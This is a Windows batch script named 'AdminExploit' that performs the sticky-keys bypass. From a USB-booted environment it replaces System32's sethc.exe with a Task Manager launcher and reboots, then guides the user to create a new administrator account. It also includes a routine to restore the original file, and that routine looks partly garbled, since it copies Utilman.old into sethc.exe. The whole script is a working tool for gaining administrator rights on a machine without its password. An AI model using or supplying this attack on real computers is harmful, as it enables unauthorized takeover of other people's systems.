:start 
cls
@echo off
color 0a

title -- AdminExploit by DaddyParodz and MaRCoilBRaZ- edited by zyglorps--
echo -- made by DaddyParodz and MaRCoilBRaZ -- 

echo -----------------------------------------------------------------------------------------------

echo select an option:
echo 1 - run this if you have booted the usb 
echo 2 - run this to create an account and give it administrator privileges
echo 3 - run this to restore Utilman.exe (or simply from the desktop when you're done with admin account)
echo help - show the tutorial
echo exit - well, this explain itself 


set /p choice=
if %choice% == 1 goto 1bat
if %choice% == 2 goto 2bat
if %choice% == 3 goto 3bat
if %choice% == help goto tutorial
if %choice% == exit exit

else goto eskere

:eskere
cls
echo -- please type only the option in the list --
echo -- every other option will bring you to this window -- 
pause
goto start



:1bat
cls
@echo off
color 0a

title -- cmd Taskmgr.exe --
echo -- Made by DaddyParodz and MaRCoilBRaZ-edited by Zyglorps :) --
echo -- starting backup --

echo.

C:
cd Windows
cd System32

copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.old

echo.
timeout /t 3
cls 
echo --- sethc.exe backup created --- 

echo.
echo ----------------------------------------------------------------------------------------------
echo -- replacing sethc.exe with Task Manager --
xcopy C:\Windows\System32\LaunchTM.exe C:\Windows\System32\sethc.exe

echo.
timeout /t 3
cls 

echo --- TM replace done --  

echo.

pause
echo --- restarting system ---
echo -- please remove usb device after the screen goes black -- 
timeout /t 5 


wpeutil reboot
exit




:2bat
cls
@echo off
color 0a
start 


echo -- Made by DaddyParodz and MaRCoilBRaZ(edited by Zyglorps) --
title -- admin account --
echo -- now is your turn --
echo ------------------------------------------------------------------------------------------------

start notepad "copypaste.txt"

echo ------------------------------------------------------------------------------------------------

echo -- write out this 2 command from the txt file in the cmd window that just appeared --
echo -- remember to replace the [name] and [password] with what you want --


pause 

exit 




:3bat
@shift /0
@echo off
cls
color 0a

title -- THIS WILL RESTORE THE ORIGINAL sethc.exe --
echo -- Made by DaddyParodz and MaRCoilBRaZ(again, edited by Zyglorps) -- 
echo ----------------------------------------------------------------------------------------
echo -- execute this command only if you are logged in as admin --
echo -- if you execute this on the "select user" screen, please close this command and log in as admin --
echo -- if you don't follow my instruction this command will not work --
pause 

cls 
echo are you logged in as administrator ? (Y/N)
set /p login=
if %login% == y goto start
if %login% == n goto escape

pause


:escape
cls 
echo -- execute this command only if you are logged in as admin --
pause 
exit 

:start

echo select 2 (again, from usb boot cmd, not when logged into your new account) if 1 is not working (1/2)
set /p login=
if %login% == 1 goto 1
if %login% == 2 goto 2

:1
cls 
echo -- restoring sethc.exe -- 
timeout /t 3
cls
echo.

echo Getting privileges over sethc.exe

icacls C:\Windows\System32\sethc.exe /grant %username%:F
del C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.old /grant %username%:F

xcopy C:\Windows\System32\Utilman.old C:\Windows\System32\sethc.exe

rem del C:\Windows\System32\sethc.old

echo.
echo -- Original sethc.exe RESTORED(hopefully). --
echo.
echo read logs up here, if it didn't work, try selecting 2 instead of 1

echo bye bye

echo.

pause

echo.

exit

:2
@echo off
cls
C:
icacls C:\Windows\System32\sethc.exe /grant %username%:F
del C:\Windows\System32\sethc.exe
copy sethc.exe C:\Windows\System32\sethc.exe
echo . 
echo read the errors up here and check if it has successfully copied sethc.exe from the usb to sys32
echo if not, read the manual mode tutorial on github or "tutorial" command.
echo.
echo bye.
pause
exit


:tutorial 
@echo off 
color 0f 
cls 
echo -- the tutorial will be opened in notepad -- 
start notepad "tutorial.txt"
timeout /t 3
goto start 
